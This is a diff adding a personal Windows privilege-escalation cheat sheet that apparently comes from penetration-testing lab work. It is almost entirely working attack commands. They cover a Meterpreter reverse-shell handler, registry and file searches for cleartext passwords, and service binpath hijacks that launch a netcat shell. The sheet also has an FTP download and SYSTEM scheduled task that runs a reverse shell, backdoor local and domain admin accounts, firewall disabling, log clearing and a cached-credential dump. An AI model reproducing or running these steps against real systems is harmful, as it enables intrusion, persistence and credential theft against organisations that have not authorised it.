@@ -1,0 +1,439 @@
+================================================================================
+METERPRETER. TRANSFER. FAST. PORTFWD. FAST. PSEXEC. FAST.
+================================================================================
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.11.0.211
+set LPORT 443
+================================================================================
+
+
+WINDOWS SYSTEM INFORMATION
+systeminfo
+
+================================================================================
+[+ PROXYCHAINS INTO WINDOWS REMOTE DESKTOP]
+proxychains rdesktop -g 80% -u <user> -p <password> -d <domain> <IP>
+ASK: "Is the user part of the local Admin users?"
+net user <username>
+================================================================================
+[PART 1]
+# BASICS
+================================================================================
+systeminfo
+hostname
+
+# WHO AM I?
+whoami
+echo %username%
+
+# WHAT USERS/LOCALGROUPS ARE ON THIS MACHINE?
+net users
+net localgroups
+
+# CHECK TO SEE IF THE USER AS PRIVILEGES
+net user user1
+
+# VIEW DOMAIN GROUPS
+net group /domain
+
+# VIEW MEMBERS OF DOMAIN GROUPS
+net group /domain <Group Name>
+
+# FIREWALL
+netsh firewall show state
+netsh firewall show config
+
+# NETWORK
+ipconfig /all
+route print
+arp -A
+
+# HOW WELL PATCHED IS THIS SYSTEM?
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+================================================================================
+[+ PART 2]
+====CLEARTEXT PASSWORDS IN FILES====
+================================================================================
+CLEARTEXT PASSWORDS. SEARCH FOR THEM.
+findstr /si password *.txt
+findstr /si password *.xml
+findstr /si password *.ini
+
+#FIND ALL THOSE STRINGS IN CONFIG FILES
+dir /s *pass* == *cred* == *vnc* == *.config*
+
+# FIND ALL PASSWORDS IN ALL FILES
+findstr /spin "password" *.*
+findstr /spin "password" *.*
+
+====CLEARTEXT PASSWORDS IN REGISTRY====
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+# WINDOWS AUTOLOGIN
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# SNMP PARAMETERS
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+# PUTTY
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+
+# SEARCH FOR CLEARTEXT PASSWORDS IN REGISTRY
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+
+================================================================================
+[+ PART 3]
+====SERVICES AND PORT FORWARDING====
+================================================================================
+netstat -ano
+
+Local address 0.0.0.0
+Local address 0.0.0.0 means that the service is listening on all interfaces.
+This means that it can receive a connection from the network card, from the
+loopback interface or any other interface. This means that anyone can connect to it.
+
+Local address 127.0.0.1
+Local address 127.0.0.1 means that the service is only listening for connection
+from the your PC. Not from the internet or anywhere else.
+This is interesting to us!
+
+Local address 192.168.1.9
+Local address 192.168.1.9 means that the service is only listening for connections
+from the local network. So someone in the local network can connect to it, but
+not someone from the internet. This is also interesting to us!
+
+====FORWARD OUT A SERVICE====
+# Port forward using plink
+plink.exe -l root -pw mysecretpassword <MYIP> -R 8080:127.0.0.1:8080
+
+#PORT FORWARD USING METERPRETER
+portfwd add -l <attacker port> -p <victim port> -r <victim ip>
+portfwd add -l 3306 -p 3306 -r 192.168.1.101
+
+================================================================================
+[+ PART 5]
+====SCHEDULED TASKS====
+================================================================================
+Here we are looking for tasks that are run by a privileged user, and run a binary
+that we can overwrite.
+schtasks /query /fo LIST /v
+
+Yeah I know this ain't pretty, but it works. You can of course change the name
+SYSTEM to another privileged user. In other words, copy the output into Kali and
+just grep for SYSTEM. lol... nice.
+cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+
+====CHANGE THE UPNP SERVICE BINARY====
+sc config upnphost binpath= "C:\Inetpub\nc.exe 192.168.1.101 6666 -e c:\Windows\system32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
+sc config upnphost depend= ""
+
+================================================================================
+[+ PART 6]
+====WEAK. SERVICE. PERMISSIONS.====
+================================================================================
+
+Services on windows are programs that run in the background. Without a GUI.
+
+IF YOU FIND A SERVICE THAT HAS WRITE PERMISSIONS set to "EVERYONE", you can change
+that binary INTO YOUR OWN CUSTOM BINARY and make it execute in the privileged context.
+
+First we need to find services. That can be done using wmci or sc.exe. Wmci is
+not available on all windows machines, and it might not be available to your user.
+
+If you don't have access to it, you can use sc.exe.
+
+====WEAK. SERVICE. PERMISSIONS. CONTINUED====
+====WITH WMCI====
+wmic service list brief
+
+This will produce a lot out output and we need to know which one of all of these
+services have weak permissions. IN ORDER TO CHCEK THAT, we can use the icacls program.
+
+Notice that icacls is only available from Vista and up. XP and lower has cacls instead.
+
+As you can see in the command below you need to make sure that you have access to
+wimc, icacls and write privilege in C:\windows\temp.
+--------------------------------------------------------------------------------
+for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+
+ICACLS
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+CACLS
+for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c cacls "%a"
+--------------------------------------------------------------------------------
+====SC.EXE====
+--------------------------------------------------------------------------------
+sc query state= all | findstr "SERVICE_NAME:" >> ServiceNames.txt
+
+FOR /F %i in (ServiceNames.txt) DO echo %i
+type ServiceNames.txt
+
+FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i >> Services.txt
+
+FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+--------------------------------------------------------------------------------
+NOW YOU CAN PROCESS THEM ONE BY ONE WITH THE CALCS COMMAND.
+cacls "C:\path\to\file.exe"
+--------------------------------------------------------------------------------
+================================================================================
+EXAMPLE:
+C:\path\to\file.exe
+BUILTIN\Users:F
+BUILTIN\Power Users:C
+BUILTIN\Administrators:F
+NT AUTHORITY\SYSTEM:F
+
+That means your user has write access. So you can JUST RENAME the .exe file and
+then ADD YOUR OWN MALICIOUS binary. And then RESTART THE PROGRAM and your binary
+will be executed instead.
+
+This can be a simple getsuid program or a reverse shell that you create with msfvenom.
+Here is a POC code for getsuid:
+--------------------------------------------------------------------------------
+#include <stdlib.h>
+int main ()
+{
+int i;
+    i = system("net localgroup administrators theusername /add");
+return 0;
+}
+--------------------------------------------------------------------------------
+AND THEN COMPILE IT WITH THIS:
+i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
+--------------------------------------------------------------------------------
+====NOW, RESTART THE SERVICE. WITH EITHER WMIC OR NET====
+RESTART THE SERVICE WITH WMIC:
+
+wmic service NAMEOFSERVICE call startservice
+
+RESTART THE SERVICE WITH NET:
+net stop [service name] && net start [service name].
+
+
+....
+The binary should now be executed in the SYSTEM or Administrator context.
+
+
+================================================================================
+[+ PART 7] UNQUOTED SERVICE PATHS. LOOK FOR EM.
+================================================================================
+USING WMIC:
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
+
+USING SC:
+sc query
+sc qc service name
+
+WHAT AM I LOOKING FOR HERE?
+IF THE PATH CONTAINS ONLY "" AND SPACES - WELL...IT'S VULNERABLE.
+
+HAVE A HIT?
+icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"
+
+EXPLOIT IT.
+
+IF THE PATH TO THE BINARY IS THIS:
+C:\Program Files\something\winamp.exe
+
+CHANGE IT TO DUH:
+C:\WHOA_A_PAYLOAD.EXE
+
+DO THAT WITH SC COMMANDS ABOVE (OR BELOW WITH BOB) AS REFERENCE.
+
+WELL THAT WAS FUN. ALMOST DONE.
+
+================================================================================
+[ON WINDOWS XP AND OLDER WE CAN GET AN ADMINISTRATIVE COMMAND PROMPT]
+================================================================================
+IF you have a GUI with a USER THAT IS INCLUDED IN THE Administrators GROUP you first
+need to open up cmd.exe for the administrator. If you open up the cmd that is in
+Accessories it will be opened up as a normal user. And if you rightclick and do
+Run as Administrator you might need to know the Administrators password. Which
+you might not know. So instead you open up the cmd from c:\windows\system32\cmd.exe.
+This will give you a cmd with Administrators rights.
+
+From here we want to become SYSTEM user. To do this we run:
+First we check what time it is on the local machine:
+
+time
+
+# Now we set the time we want the system CMD to start.
+# Probably one minuter after the time.
+at 01:23 /interactive cmd.exe
+
+BOOM SYSTEM.
+================================================================================
+[UP TO VISTA] THIS IS NICE.
+You first need to upload PsExec.exe and then you run:
+psexec -i -s cmd.exe
+
+BOOM SYSTEM.
+
+
+
+THAT WAS FUN.
+
+
+================================================================================
+# RDP
+# Add yourself and start RDP
+
+net user siren somepass /add
+net localgroup administrators siren /add 
+net localgroup "Remote Desktop Users" siren /add 
+
+#Execute Second
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+sc config TermService start= auto
+#IF POWERSHELL
+sc.exe config TermService start= auto
+sc start TermService
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+netstat -an | find "3389"
+xfreerdp /u:siren /p:somepass /v:10.65.1.40:3389 /cert:ignore /timeout:60000
+
+#If needed:
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
+netsh firewall set opmode disable
+net start TermService
+================================================================================
+[ Stuff Done in the Past ] SERVICE PATH CHANGING AS DONE WITH BOB.
+sc config UPNPHOST binpath= "C:\inetpub\siren\sirenInc.exe"
+sc config UPNPHOST obj= ".\LocalSystem" password= ""
+sc config SSDPSRV binpath= "C:\inetpub\siren\sirenInc.exe"
+sc config SSDPSRV obj= ".\LocalSystem" password= ""
+sc config SSDPSRV start= "demand"
+[*] Stage Payload Listener in Meterpreter
+net start SSDPSRV
+================================================================================
+--==DO THIS FIRST, CHECK FOR WEAK SERVICE PERMISSIONS. EACH LINE INTO path.txt==--
+sc query state= all | findstr "SERVICE_NAME:" >> ServiceNames.txt
+FOR /F %i in (ServiceNames.txt) DO echo %i
+
+type ServiceNames.txt
+FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i >> Services.txt
+
+3.
+FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+================================================================================
+[+ Accesschk]
+cd %temp%
+--->FileTransfer
+
+// Accesschk stuff
+accesschk.exe /accepteula (always do this first!!!!!)
+accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
+accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
+accesschk.exe -ucqv [service_name]
+
+// Find all weak folder permissions per drive.
+accesschk.exe -uwdqs Users c:\
+accesschk.exe -uwdqs "Authenticated Users" c:\
+
+// Find all weak file permissions per drive.
+accesschk.exe -uwqs Users c:\*.*
+accesschk.exe -uwqs "Authenticated Users" c:\*.*
+================================================================================
+1. Get and Run wmic_info.bat - read it over.
+================================================================================
+STUFF DONE IN THE PAST
+
+Did you come in as a NT AUTHORITY\NETWORK SERVICE?
+MS09-012.exe "whoami"
+Initiate Network-Related Transfer Again.
+MS09-012.exe "ftp -v -n -s:ftp.txt" and come back in NT Shell.
+================================================================================
+[+ Clear Logs]
+SYSTEM + RDP = as nt-authority system or administrator --> eventvrw.msc
+psexec /accepteula -s cmd.exe /c cmd.exe
+================================================================================
+[+ IF I AM AN ADMIN ON THE MACHINE AND WANT TO TRY FOR SYSTEM.] (Worked on Win7)
+cd /d C:\
+
+mkdir Tools
+
+Note: maint.exe is a regular x86 reverse netcat compatible shell on PORT 443.
+echo open 10.11.0.211 21 > ftp.txt
+echo USER ftpuser >> ftp.txt
+echo superpass>> ftp.txt
+echo bin >> ftp.txt
+echo GET maint.exe >> ftp.txt
+echo bye >> ftp.txt
+
+ftp -v -n -s:ftp.txt
+
+schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn okay /tr "\"C:\\Tools\\maint.exe\""
+nc -lvp 443
+schtasks /RUN /TN "okay"
+================================================================================
+[+ TIME AND AT SCHEDULE TASK ]
+================================================================================
+C:/> time
+The current time is:  6:41:05.81
+Enter the new time:
+
+C:/> at 06:42 /interactive "C:\Tools\maint.exe"
+================================================================================
+================================================================================
+OTHER STUFF
+================================================================================
+[ADDING AN ADMINISTRATOR]
+cmd.exe /c net user siren superpass /add
+cmd.exe /c net localgroup administrators siren /add
+cmd.exe /c net localgroup "Remote Desktop Users" siren /add
+[ADDING A DOMAIN ADMINISTRATOR]
+# WINDOWS: Add domain user and put them in Domain Admins group
+net user siren superpass /ADD /DOMAIN
+net localgroup Administrators siren /ADD /DOMAIN
+net localgroup "Remote Desktop Users" siren /ADD
+net group "Domain Admins" siren /ADD /DOMAIN
+net group "Enterprise Admins" siren /ADD /DOMAIN
+net group "Schema Admins" siren /ADD /DOMAIN
+net group "Group Policy Creator Owners" siren /ADD /DOMAIN
+
+================================================================================
+===SHARES
+Create a Share.
+NET SHARE
+NET USE
+
+===CREATE SHARE
+NET SHARE <sharename>=<drive/folderpath /remark:"some remark"
+
+===MOUNT SHARE
+NET USE Z: \\COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES
+
+===UNMOUNT SHARE
+NET USE Z: /DELETE
+
+===DELETE SHARE
+NET SHARE <SHARE_NAME> /DELETE
+===============================================================================
+// Find all weak file permissions per drive.
+accesschk.exe -uwqs Users c:\*.*
+// A part of group "Authenticated Users" - you would be surprised if you have a real user.
+accesschk.exe -uwqs "Authenticated Users" c:\*.*
+===============================================================================
+
+====[Remember PSpy32 & PSpy64? - This is like that - Check for scheduled items / cron jobs]=====
+schtasks /query /fo LIST /v
+
+================================================================================
+[Dude, this]
+use exploit/windows/local/service_permissions.
+================================================================================
+EXECUTE POWERSHELL PRIVILEGE ESCALATION SCRIPT FOR THE LOVE OF GOD.
+powershell.exe 'C:\Tools\privesc.ps1'
+================================================================================
+#RDP
+"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+================================================================================
+#DUMP GROUP CACHED CREDENTIALS
+meterpreter > back
+use post/windows/gather/cachedump
